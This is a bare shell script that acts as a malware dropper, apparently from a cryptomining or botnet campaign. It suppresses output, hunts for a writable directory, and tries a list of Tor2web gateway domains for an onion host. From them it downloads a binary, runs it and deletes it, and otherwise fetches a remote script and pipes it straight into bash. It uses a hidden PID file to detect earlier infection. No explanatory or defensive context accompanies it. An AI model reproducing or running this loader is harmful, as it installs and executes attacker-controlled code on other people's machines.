exec & > /dev/null
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
t=trump3mtcnmxzfix
dir=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
for i in /usr/bin $dir /dev/shm /tmp /var/tmp;do touch $i/i && cd $i && rm -f i && break;done
x() {
	f=/int
	d=./$(date|md5sum|cut -f1 -d-)
	wget -t1 -T60 -qU- --no-check-certificate $1$f -O$d || curl -m60 -fsSLkA- $1$f -o$d
	chmod +x $d;$d;rm -f $d
}
u() {
	x=/crn
	wget -t1 -T60 -qU- -O- --no-check-certificate $1$x || curl -m60 -fsSLkA- $1$x
}
for h in tor2web.io onion.to onion.mn onion.in.net 4tor.ml d2web.org onion.glass civiclink.network tor2web.su onion.ly onion.pet onion.ws
do
	if ! ls /proc/$(cat /tmp/.X11-unix/00)/io; then
		x trump3mtcnmxzfix.$h
	else
		break
	fi
done

if ! ls /proc/$(cat /tmp/.X11-unix/00)/io; then
	(
		u $t.tor2web.io ||
		u $t.onion.to ||
		u $t.onion.mn ||
		u $t.onion.in.net ||
		u $t.4tor.ml ||
		u $t.d2web.org ||
		u $t.onion.glass ||
		u $t.civiclink.network ||
		u $t.tor2web.su ||
		u $t.onion.ly ||
		u $t.onion.pet ||
		u $t.onion.ws
	)|bash
fi
